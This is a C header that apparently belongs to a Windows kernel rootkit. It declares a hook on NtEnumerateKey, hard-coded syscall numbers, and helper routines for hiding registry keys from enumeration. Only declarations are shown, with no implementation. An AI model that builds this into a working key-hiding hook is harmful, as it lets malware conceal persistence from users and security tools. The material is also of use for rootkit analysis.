#ifndef _KEY_H_
#define _KEY_H_
#include "inc.h"
#define NUMBER_NT_ENUMERATE_KEY  0x47
#define NUMBER_NT_QUERY_KEY  0xa0

typedef NTSTATUS(*NT_ENUMERATE_KEY)(
	HANDLE                KeyHandle,
	ULONG                 Index,
	KEY_INFORMATION_CLASS KeyInformationClass,
	PVOID                 KeyInformation,
	ULONG                 Length,
	PULONG                ResultLength
	);

typedef struct _TASK_QUEUE_KEY {
	PWCHAR target;
	PWCHAR change;
	LIST_ENTRY link;
} TASK_QUEUE_KEY, *PTASK_QUEUE_KEY;
LIST_ENTRY glTaskQueueKey;
PAGED_LOOKASIDE_LIST glPagedTaskQueueKey;

typedef struct _HIDE_LAST_KEY {
	HANDLE KeyHandle;
	ULONG Index;
	LIST_ENTRY link;
} HIDE_LAST_KEY, * PHIDE_LAST_KEY;
LIST_ENTRY glHideLastKey;
PAGED_LOOKASIDE_LIST glPagedHideLastKey;


NT_ENUMERATE_KEY glRealNtEnumerateKey;

NTSTATUS NTAPI HookNtEnumerateKey(
	HANDLE                KeyHandle,
	ULONG                 Index,
	KEY_INFORMATION_CLASS KeyInformationClass,
	PVOID                 KeyInformation,
	ULONG                 Length,
	PULONG                ResultLength
);


NTSTATUS HideKey(KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation);
VOID TaskQueueByKey(PCHAR target);
VOID ListHidingKeys(HANDLE KeyHandle, ULONG Index);
VOID FreeTaskQueueKeyList();
VOID FreeListHidingKeys();
VOID PrintTaskQueueKeyList();

#endif // !_KEY_H_
